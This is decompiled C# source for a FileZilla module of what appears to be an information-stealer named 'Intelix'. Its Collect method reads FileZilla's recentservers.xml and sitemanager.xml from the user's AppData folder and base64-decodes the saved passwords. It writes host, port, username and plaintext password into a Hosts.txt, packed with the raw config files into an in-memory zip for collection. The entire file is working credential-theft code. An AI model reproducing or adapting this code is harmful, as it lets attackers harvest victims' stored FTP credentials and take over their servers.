using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000040 RID: 64
	public class FileZilla : ITarget
	{
		// Token: 0x060000D8 RID: 216 RVA: 0x0000C500 File Offset: 0x0000A700
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string str = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
			string[] array = new string[]
			{
				str + "recentservers.xml",
				str + "sitemanager.xml"
			};
			bool flag = !File.Exists(array[0]) && !File.Exists(array[1]);
			if (!flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "FileZilla";
				List<string> list = new List<string>();
				string[] array2 = array;
				foreach (string text in array2)
				{
					bool flag2 = !File.Exists(text);
					if (!flag2)
					{
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(text);
						foreach (object obj in xmlDocument.GetElementsByTagName("Server"))
						{
							XmlNode xmlNode = (XmlNode)obj;
							string text2;
							if (xmlNode == null)
							{
								text2 = null;
							}
							else
							{
								XmlElement xmlElement = xmlNode["Pass"];
								text2 = ((xmlElement != null) ? xmlElement.InnerText : null);
							}
							string text3 = text2;
							bool flag3 = !string.IsNullOrEmpty(text3);
							if (flag3)
							{
								string[] array4 = new string[5];
								array4[0] = "ftp://";
								int num = 1;
								XmlElement xmlElement2 = xmlNode["Host"];
								array4[num] = ((xmlElement2 != null) ? xmlElement2.InnerText : null);
								array4[2] = ":";
								int num2 = 3;
								XmlElement xmlElement3 = xmlNode["Port"];
								array4[num2] = ((xmlElement3 != null) ? xmlElement3.InnerText : null);
								array4[4] = "/";
								string text4 = string.Concat(array4);
								XmlElement xmlElement4 = xmlNode["User"];
								string text5 = (xmlElement4 != null) ? xmlElement4.InnerText : null;
								string @string = Encoding.UTF8.GetString(Convert.FromBase64String(text3));
								list.Add(string.Concat(new string[]
								{
									"Url: ",
									text4,
									"\nUsername: ",
									text5,
									"\nPassword: ",
									@string
								}));
							}
						}
						string text6 = "FileZilla\\" + Path.GetFileName(text);
						zip.AddFile(text6, File.ReadAllBytes(text));
						counterApplications.Files.Add(text + " => " + text6);
					}
				}
				string text7 = "FileZilla\\Hosts.txt";
				counterApplications.Files.Add(text7 ?? "");
				zip.AddTextFile(text7, string.Join("\n\n", list.ToArray()));
				counter.Applications.Add(counterApplications);
			}
		}
	}
}
